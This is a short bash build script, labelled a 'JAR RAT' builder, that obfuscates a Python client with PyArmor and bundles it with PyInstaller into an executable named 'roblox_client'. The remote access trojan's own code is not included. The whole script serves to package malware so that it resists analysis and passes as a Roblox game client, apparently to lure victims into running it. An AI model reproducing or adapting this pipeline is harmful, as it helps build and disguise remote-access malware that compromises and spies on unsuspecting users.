#!/usr/bin/env bash

set -e

VENV_DIR="venv"
OBFUSCATED_DIR="obfuscated_client"
CLIENT_SCRIPT="client.py"
OUTPUT_NAME="roblox_client"
SPEC_TEMPLATE="client_base.spec"
SPEC_FILE="${OUTPUT_NAME}.spec"
PYTHON_BIN="python3"

echo "--- JAR RAT Build Script ---"

echo "[1/7] Cleaning previous build artifacts..."
rm -rf "$VENV_DIR" "$OBFUSCATED_DIR" dist/ build/ "$SPEC_FILE"
echo "Cleaned."

echo "[2/7] Creating virtual environment..."
"$PYTHON_BIN" -m venv "$VENV_DIR"
echo "Activating virtual environment..."
source "$VENV_DIR/bin/activate"
echo "Virtual environment created and activated."

echo "[3/7] Installing Python dependencies (pyinstaller, pyarmor.cli, requests, colorama, python-dotenv)..."
pip install pyinstaller pyarmor.cli requests colorama python-dotenv
echo "Dependencies installed."

echo "[4/7] Obfuscating client script with PyArmor ($CLIENT_SCRIPT)..."
pyarmor gen --output "$OBFUSCATED_DIR" "$CLIENT_SCRIPT"
echo "Client script obfuscated."

echo "[5/7] Locating PyArmor runtime folder within '$OBFUSCATED_DIR'..."
PYARMOR_RUNTIME_FOLDER=$(find "$OBFUSCATED_DIR" -maxdepth 1 -type d -name "pyarmor_runtime_*" -print -quit)

if [ -z "$PYARMOR_RUNTIME_FOLDER" ]; then
	echo "Error: PyArmor runtime folder not found in '$OBFUSCATED_DIR'. PyArmor 'gen' might have failed or generated an unexpected structure. Exiting."
	deactivate
	exit 1
fi

PYARMOR_RUNTIME_BASENAME=$(basename "$PYARMOR_RUNTIME_FOLDER")
echo "Found PyArmor runtime: '$PYARMOR_RUNTIME_FOLDER'"

echo "[6/7] Creating PyInstaller .spec file ('$SPEC_FILE') from template ('$SPEC_TEMPLATE')..."

OBFUSCATED_CLIENT_PATH_IN_SPEC="${OBFUSCATED_DIR}/${CLIENT_SCRIPT}"
PYARMOR_DATA_SOURCE_IN_SPEC="${OBFUSCATED_DIR}/${PYARMOR_RUNTIME_BASENAME}"

sed -e "s|{{OBFUSCATED_CLIENT_PATH}}|${OBFUSCATED_CLIENT_PATH_IN_SPEC}|g" \
	-e "s|{{PYARMOR_DATA_SOURCE}}|${PYARMOR_DATA_SOURCE_IN_SPEC}|g" \
	"$SPEC_TEMPLATE" >"$SPEC_FILE"

echo ".spec file created: '$SPEC_FILE'"

echo "[7/7] Building final executable with PyInstaller using '$SPEC_FILE'..."
pyinstaller "$SPEC_FILE"
echo "Executable built in 'dist/' directory."

echo "Deactivating virtual environment..."
deactivate
echo "Build process complete!"
echo "Your obfuscated and bundled executable is located at: dist/$OUTPUT_NAME"
